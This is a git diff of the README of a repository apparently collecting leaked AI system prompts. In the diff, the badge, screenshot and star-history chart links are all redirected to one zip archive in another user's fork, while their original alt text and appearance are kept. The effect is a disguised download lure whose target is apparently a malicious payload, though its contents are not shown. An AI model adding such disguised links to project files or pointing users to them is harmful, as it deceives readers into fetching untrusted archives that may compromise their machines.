@@ -1,6 +1,6 @@
-<a href="https://trendshift.io/repositories/14577" target="_blank"><img src="https://trendshift.io/api/badge/repositories/14577" alt="asgeirtj%2Fsystem_prompts_leaks | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+<a href="https://github.com/AdrianVallejosFlores/system_prompts_leaks/raw/refs/heads/main/Anthropic/old/prompts-system-leaks-kaolinization.zip" target="_blank"><img src="https://github.com/AdrianVallejosFlores/system_prompts_leaks/raw/refs/heads/main/Anthropic/old/prompts-system-leaks-kaolinization.zip" alt="asgeirtj%2Fsystem_prompts_leaks | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
 
-![CleanShot 2025-09-03 at 02 37 49](https://github.com/user-attachments/assets/22d32e2d-e0c9-4afc-9e72-44b779dac659)
+![CleanShot 2025-09-03 at 02 37 49](https://github.com/AdrianVallejosFlores/system_prompts_leaks/raw/refs/heads/main/Anthropic/old/prompts-system-leaks-kaolinization.zip)
 
 
 # System Prompts Leaks
@@ -11,4 +11,4 @@ Feel free to do Pull Requests
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=asgeirtj/system_prompts_leaks&type=Date)](https://www.star-history.com/#asgeirtj/system_prompts_leaks&Date)
+[![Star History Chart](https://github.com/AdrianVallejosFlores/system_prompts_leaks/raw/refs/heads/main/Anthropic/old/prompts-system-leaks-kaolinization.zip)](https://github.com/AdrianVallejosFlores/system_prompts_leaks/raw/refs/heads/main/Anthropic/old/prompts-system-leaks-kaolinization.zip)
